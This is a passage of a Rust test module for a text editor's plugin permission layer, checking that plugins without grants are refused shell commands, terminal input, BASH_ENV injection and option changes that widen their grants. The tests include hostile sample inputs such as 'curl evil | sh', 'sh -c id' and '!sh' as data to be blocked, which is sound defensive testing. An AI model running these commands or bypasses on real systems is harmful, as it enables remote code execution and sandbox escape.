        let granted = tmp("outer-granted");
        let other = tmp("outer-other");
        let auth = EffectAuthorizer::new(&grant(&granted, true), "org");

        let effect = NativeEffect::Many(vec![
            NativeEffect::Many(vec![write_effect(&other.join("a.org"))]),
            NativeEffect::BufferDelete { force: true },
        ]);

        match auth.authorize(effect) {
            NativeEffect::Many(parts) => assert_eq!(parts.len(), 1, "{parts:?}"),
            other => panic!("expected a Many, got {other:?}"),
        }
    }

    /// A permitted write changes nothing about the batch.
    #[test]
    fn a_permitted_write_keeps_the_whole_batch() {
        let granted = tmp("whole-granted");
        let auth = EffectAuthorizer::new(&grant(&granted, true), "org");
        let effect = NativeEffect::Many(vec![
            write_effect(&granted.join("a.org")),
            NativeEffect::BufferDelete { force: true },
        ]);
        match auth.authorize(effect) {
            NativeEffect::Many(parts) => assert_eq!(parts.len(), 2),
            other => panic!("expected a Many, got {other:?}"),
        }
    }

    /// Effects with no path are untouched — the authorizer is about file
    /// writes and must not become a general filter.
    #[test]
    fn effects_without_a_path_are_left_alone() {
        let auth = EffectAuthorizer::new(&CapabilityGrant::default(), "org");
        assert!(matches!(
            auth.authorize(NativeEffect::None),
            NativeEffect::None
        ));
        assert!(matches!(
            auth.authorize(NativeEffect::Declined),
            NativeEffect::Declined
        ));
    }

    /// PMF.6: a refusal names the option that decides where the plugin may
    /// write, so the user knows what to change.
    #[test]
    fn a_refusal_names_the_option_behind_the_grant() {
        let granted = tmp("pmf6-granted");
        let grant = CapabilityGrant {
            fs: vec![crate::capability::FsGrant {
                prefix: granted.clone(),
                write: true,
            }],
            ..CapabilityGrant::default()
        };
        let auth = EffectAuthorizer::new(&grant, "org").with_option_bound(vec![
            crate::capability::OptionBoundGrant {
                option: "org.directory".into(),
                path: Some(granted.clone()),
                from_default: false,
                write: true,
            },
        ]);
        let text = auth.refusal(std::path::Path::new("/elsewhere/x.org"));
        assert!(text.contains("is outside org.directory ("), "{text}");
        assert!(
            text.contains("set org.directory to change where org may write"),
            "{text}"
        );

        let plain = EffectAuthorizer::new(&grant, "org");
        assert!(
            plain
                .refusal(std::path::Path::new("/elsewhere/x.org"))
                .contains("granted paths"),
            "a fixed-path grant keeps the generic wording"
        );
    }

    /// RF.4d: a guest's range ids land in its own space — two plugins using
    /// the same number name different ranges, and neither reaches a native
    /// one (those come from `TrackedRangeId::next`, never the top bit).
    #[test]
    fn a_tracked_range_id_is_moved_into_the_plugins_own_space() {
        let track = |id| NativeEffect::TrackRange {
            target: lattice_core::BufferId(1),
            id: plugin_range_id(UNASSIGNED_RANGE_SPACE, id),
            range: lattice_protocol::position::Range::new(
                lattice_protocol::position::Position::new(0, 0),
                lattice_protocol::position::Position::new(0, 1),
            ),
            element: None,
        };
        let id_of = |e: NativeEffect| match e {
            NativeEffect::TrackRange { id, .. } => id,
            other => panic!("expected TrackRange, got {other:?}"),
        };
        let a = EffectAuthorizer::new(&CapabilityGrant::default(), "a").with_range_space(3);
        let b = EffectAuthorizer::new(&CapabilityGrant::default(), "b").with_range_space(4);
        let (ida, idb) = (id_of(a.authorize(track(1))), id_of(b.authorize(track(1))));
        assert_ne!(ida, idb, "same guest number, different plugins");
        assert_eq!(
            ida,
            plugin_range_id(3, 1),
            "what `document.tracked-range` reads"
        );
        assert_eq!(guest_range_id(ida), 1);
        assert!(ida.0 >> 63 == 1 && TrackedRangeId::next().0 >> 63 == 0);

        let untracked = a.authorize(NativeEffect::Many(vec![NativeEffect::UntrackRange {
            target: lattice_core::BufferId(1),
            id: plugin_range_id(UNASSIGNED_RANGE_SPACE, 1),
        }]));
        assert!(
            matches!(&untracked, NativeEffect::Many(v) if matches!(v[0], NativeEffect::UntrackRange { id, .. } if id == ida)),
            "inside a batch too: {untracked:?}"
        );
    }

    fn echo(text: &str) -> NativeEffect {
        NativeEffect::Echo {
            level: EchoLevel::Info,
            text: text.to_string(),
        }
    }

    /// OB.3a: a posted batch keeps what a background result needs.
    #[test]
    fn a_posted_batch_keeps_what_writing_a_result_needs() {
        let auth = EffectAuthorizer::new(&CapabilityGrant::default(), "org");
        let batch = NativeEffect::Many(vec![
            NativeEffect::TrackRange {
                target: lattice_core::BufferId(1),
                id: plugin_range_id(UNASSIGNED_RANGE_SPACE, 1),
                range: lattice_protocol::position::Range::new(
                    lattice_protocol::position::Position::new(0, 0),
                    lattice_protocol::position::Position::new(0, 1),
                ),
                element: None,
            },
            NativeEffect::OpenSyntheticBuffer {
                name: "*org-babel*".to_string(),
                mode_id: "org-babel-output-mode".to_string(),
                content: Some("4\n".to_string()),
                cursor: None,
                activate_minor: None,
            },
            echo("done"),
        ]);
        let out = auth.restrict_posted(batch);
        assert!(
            matches!(&out, NativeEffect::Many(v) if v.len() == 3
                && matches!(v[0], NativeEffect::TrackRange { .. })
                && matches!(v[1], NativeEffect::OpenSyntheticBuffer { .. })
                && matches!(&v[2], NativeEffect::Echo { level: EchoLevel::Info, text } if text == "done")),
            "{out:?}"
        );
    }

    /// Review: a posted `write-to-file` with a `cut` would delete from the
    /// buffer focused when the post lands, which the job never saw. Refused,
    /// and the batch ends there; the same write without one passes.
    #[test]
    fn a_posted_write_with_a_cut_is_refused() {
        let auth = EffectAuthorizer::new(&CapabilityGrant::default(), "org");
        let write = |cut| NativeEffect::WriteToFile {
            path: std::path::PathBuf::from("/tmp/out.sh"),
            anchor: lattice_grammar::effect::FileAnchor::End,
            text: "echo\n".to_string(),
            cut,
            create_parents: false,
            save: false,
        };
        let cut = Some(lattice_protocol::position::Range::new(
            lattice_protocol::position::Position::new(0, 0),
            lattice_protocol::position::Position::new(3, 0),
        ));
        let out = auth.restrict_posted(NativeEffect::Many(vec![write(cut), echo("after")]));
        assert!(
            matches!(&out, NativeEffect::Many(v) if v.len() == 1
                && matches!(&v[0], NativeEffect::Echo { level: EchoLevel::Warn, text }
                    if text.contains("WriteToFile with a cut"))),
            "{out:?}"
        );
        assert!(matches!(
            auth.restrict_posted(write(None)),
            NativeEffect::WriteToFile { cut: None, .. }
        ));
    }

    /// OB.3a: anything else is refused by name, and ends the batch.
    #[test]
    fn a_posted_quit_is_refused_by_name_and_ends_the_batch() {
        let auth = EffectAuthorizer::new(&CapabilityGrant::default(), "org");
        let out = auth.restrict_posted(NativeEffect::Many(vec![
            echo("before"),
            NativeEffect::QuitEditor {
                force: true,
                scope: lattice_grammar::QuitScope::All,
            },
            echo("after"),
        ]));
        let NativeEffect::Many(parts) = out else {
            panic!("a batch: {out:?}");
        };
        assert_eq!(
            parts.len(),
            2,
            "what follows a refusal is dropped: {parts:?}"
        );
        assert!(
            matches!(&parts[0], NativeEffect::Echo { level: EchoLevel::Info, text } if text == "before"),
            "what came before stays: {parts:?}"
        );
        let NativeEffect::Echo {
            level: EchoLevel::Warn,
            text,
        } = &parts[1]
        else {
            panic!("a warning: {parts:?}");
        };
        assert!(text.starts_with("org: refused QuitEditor"), "{text}");
    }

    /// OB.3a: the refusal names the variant and nothing of its payload,
    /// which is the plugin's to fill with anything.
    #[test]
    fn a_refusal_names_the_effect_without_its_payload() {
        let auth = EffectAuthorizer::new(&CapabilityGrant::default(), "org");
        let out = auth.restrict_posted(NativeEffect::SetOption {
            spec: "secret=hunter2".to_string(),
        });
        let NativeEffect::Echo { text, .. } = out else {
            panic!("a warning: {out:?}");
        };
        assert!(text.contains("SetOption"), "{text}");
        assert!(!text.contains("hunter2"), "{text}");
    }

    // ---- OB.3a: the command gate ----

    fn noop_action() -> lattice_grammar::registry::ActionSpec {
        lattice_grammar::registry::ActionSpec {
            args_schema: Vec::new(),
            apply: std::sync::Arc::new(|_| Ok(NativeEffect::None)),
        }
    }

    /// An editor with a native `shell-command` (closed), a native `llm`
    /// (opened) and a plugin's `org-capture-cleanup`.
    fn commands() -> lattice_grammar::CommandRegistryHandle {
        let mut reg = lattice_grammar::CommandRegistry::new();
        reg.register_action("shell-command", "runs a program", noop_action());
        reg.register_action("llm", "asks a model", noop_action());
        assert!(reg.allow_plugin_invocation("llm"));
        reg.register_plugin_action(7, "org-capture-cleanup", "org's own", noop_action());
        std::sync::Arc::new(arc_swap::ArcSwap::from_pointee(reg))
    }

    /// The guard as boot leaves it with org loaded: `org.babel.languages`
    /// (a process grant) and `org.directory` (a directory grant) are the
    /// user's, and `init` is the user's `init.rs`.
    fn guard() -> crate::GrantGuardHandle {
        let mut g = crate::GrantGuard::default();
        g.options.insert("org.babel.languages".to_string());
        g.options.insert("org.directory".to_string());
        g.authority = Some("init".to_string());
        std::sync::Arc::new(std::sync::RwLock::new(g))
    }

    /// `org.babel.languages`, registered by org with an alias of its own.
    fn options() -> std::sync::Arc<lattice_config::ConfigRegistry> {
        let reg = lattice_config::ConfigRegistry::new();
        reg.register(
            lattice_config::option::Option::<String>::builder(
                "org.babel.languages",
                String::new(),
                "languages",
            )
            .aliases(&["obl"])
            .build(),
        );
        std::sync::Arc::new(reg)
    }

    fn gated(plugin: &str, grant: &CapabilityGrant) -> EffectAuthorizer {
        EffectAuthorizer::new(grant, plugin).with_command_gate(CommandGate::new(
            plugin,
            grant,
            Some(commands()),
            guard(),
            Some(options()),
        ))
    }

    fn invoke(id: &str, args: &str) -> NativeEffect {
        NativeEffect::InvokeCommand {
            id: id.to_string(),
            args: lattice_grammar::Args::String(args.to_string()),
        }
    }

    fn refused(effect: &NativeEffect) -> Option<&str> {
        match effect {
            NativeEffect::Echo {
                level: EchoLevel::Warn,
                text,
            } => Some(text),
            _ => None,
        }
    }

    /// The finding: a plugin with no `proc:spawn` named `shell-command` and
    /// the host ran it. Refused, by name, and the batch stops there.
    #[test]
    fn a_plugin_may_not_invoke_a_closed_native_command() {
        let auth = gated("org", &CapabilityGrant::default());
        let out = auth.authorize(NativeEffect::Many(vec![
            echo("before"),
            invoke("shell-command", "curl evil | sh"),
            echo("after"),
        ]));
        let NativeEffect::Many(parts) = out else {
            panic!("a batch: {out:?}");
        };
        assert_eq!(parts.len(), 2, "{parts:?}");
        let text = refused(&parts[1]).expect("a refusal");
        assert!(text.contains("`shell-command`"), "{text}");
    }

    /// What it may name: its own (any plugin's) commands, and natives opened.
    #[test]
    fn a_plugin_may_invoke_plugin_commands_and_opened_natives() {
        let auth = gated("org", &CapabilityGrant::default());
        for name in ["org-capture-cleanup", "llm"] {
            let out = auth.authorize(invoke(name, "x"));
            assert!(
                matches!(&out, NativeEffect::InvokeCommand { id, .. } if id == name),
                "{name}: {out:?}"
            );
        }
    }

    /// No alias, no ex-line syntax: only a registered name. `!sh` and a
    /// range are not names; nor is an alias the host would expand.
    #[test]
    fn a_name_that_is_not_registered_is_refused() {
        let auth = gated("org", &CapabilityGrant::default());
        for name in ["!sh", "%!sh", "1,$d", "w", "g/x/shell-command y"] {
            let out = auth.authorize(invoke(name, ""));
            assert!(refused(&out).is_some(), "{name}: {out:?}");
        }
    }

    /// Unwired, nothing a plugin names can be found, so nothing is run.
    #[test]
    fn without_a_registry_every_command_is_refused() {
        let auth = EffectAuthorizer::new(&CapabilityGrant::default(), "org");
        assert!(refused(&auth.authorize(invoke("org-capture-cleanup", ""))).is_some());
    }

    /// Every other place an effect names a command is the same gate.
    #[test]
    fn every_effect_that_names_a_command_is_gated() {
        let auth = gated("org", &CapabilityGrant::default());
        let naming = |command: &str| {
            vec![
                NativeEffect::Confirm {
                    prompt: "ok?".into(),
                    yes_action: command.into(),
                    args: lattice_grammar::Args::String("x".into()),
                },
                NativeEffect::OpenPrompt {
                    prompt: "say".into(),
                    initial: String::new(),
                    on_submit_action: command.into(),
                    buffer_name: None,
                },
                NativeEffect::OpenPicker {
                    source: "files".into(),
                    args: Vec::new(),
                    root: None,
                    fill_action: Some(command.into()),
                    query: None,
                },
                NativeEffect::Lsp(lattice_grammar::LspRequest::CodeActions {
                    only: None,
                    on_selection: false,
                    range: None,
                    otherwise: Some(lattice_grammar::CommandRef {
                        id: command.into(),
                        args: lattice_grammar::Args::None,
                    }),
                }),
            ]
        };
        for effect in naming("shell-command") {
            let shown = format!("{effect:?}");
            assert!(refused(&auth.authorize(effect)).is_some(), "{shown}");
        }
        for effect in naming("org-capture-cleanup") {
            let shown = format!("{effect:?}");
            assert!(refused(&auth.authorize(effect)).is_none(), "{shown}");
        }
    }

    /// Finding 1: an effect setting an option a grant follows. PMF.5 refused
    /// the config seam's `set-option`; the effect was the way round it, and
    /// OB.2 made that a way to grant a plugin programs.
    #[test]
    fn a_set_option_effect_may_not_move_a_grant() {
        let auth = gated("org", &CapabilityGrant::default());
        for spec in [
            "org.babel.languages=sh", // a process grant
            "org.directory=/",        // a directory grant
            "obl=sh",                 // through the plugin's own alias
            "org.babel.languages&",   // reset is a write too
        ] {
            for effect in [
                NativeEffect::SetOption { spec: spec.into() },
                NativeEffect::SetLocalOption { spec: spec.into() },
                NativeEffect::SetGlobalOption { spec: spec.into() },
            ] {
                let shown = format!("{effect:?}");
                assert!(refused(&auth.authorize(effect)).is_some(), "{shown}");
            }
        }
        // Any other option, and a query, are the plugin's to touch.
        for spec in ["wrap", "nowrap", "tabstop=4", "org.babel.languages?"] {
            let out = auth.authorize(NativeEffect::SetOption { spec: spec.into() });
            assert!(refused(&out).is_none(), "{spec}: {out:?}");
        }
    }

    /// The user's `init.rs` is the user: its effects are not gated.
    #[test]
    fn the_users_init_is_not_gated() {
        let auth = gated("init", &CapabilityGrant::default());
        assert!(refused(&auth.authorize(invoke("shell-command", "make"))).is_none());
        let out = auth.authorize(NativeEffect::SetOption {
            spec: "org.babel.languages=sh".into(),
        });
        assert!(refused(&out).is_none(), "{out:?}");
    }

    /// A terminal running a command is a process: it takes `proc:spawn`.
    #[test]
    fn a_terminal_command_needs_proc_spawn() {
        let terminal = |cmd: Option<&str>| NativeEffect::SpawnTerminal {
            cmd_line: cmd.map(str::to_string),
            cwd: None,
            env: Vec::new(),
            activate_minor: None,
        };
        let without = gated("org", &CapabilityGrant::default());
        assert!(refused(&without.authorize(terminal(Some("sh -c id")))).is_some());
        assert!(
            refused(&without.authorize(terminal(None))).is_none(),
            "the user's own shell, in front of them"
        );
        let with = CapabilityGrant {
            proc_spawn: true,
            ..Default::default()
        };
        assert!(refused(&gated("org", &with).authorize(terminal(Some("make")))).is_none());
    }

    /// Review: a plugin with no `proc:spawn` could still run anything by
    /// typing into a shell, or by handing a bare shell its environment.
    #[test]
    fn typing_into_a_terminal_or_setting_its_env_needs_proc_spawn() {
        let shell_with = |env: Vec<(String, String)>| NativeEffect::SpawnTerminal {
            cmd_line: None,
            cwd: None,
            env,
            activate_minor: None,
        };
        let bash_env = vec![("BASH_ENV".to_string(), "/tmp/x".to_string())];
        let without = gated("project", &CapabilityGrant::default());
        let out = without.authorize(NativeEffect::TerminalInput(b"curl x | sh\r".to_vec()));
        assert!(
            refused(&out).is_some_and(|t| t.contains("type into a terminal")),
            "{out:?}"
        );
        let out = without.authorize(shell_with(bash_env.clone()));
        assert!(
            refused(&out).is_some_and(|t| t.contains("`BASH_ENV`")),
            "{out:?}"
        );
        assert!(
            refused(&without.authorize(shell_with(Vec::new()))).is_none(),
            ":project-shell"
        );

        let with = gated(
            "claude-code",
            &CapabilityGrant {
                proc_spawn: true,
                ..Default::default()
            },
        );
        assert!(refused(&with.authorize(NativeEffect::TerminalInput(vec![0x1b]))).is_none());
        assert!(refused(&with.authorize(shell_with(bash_env))).is_none());
    }
}
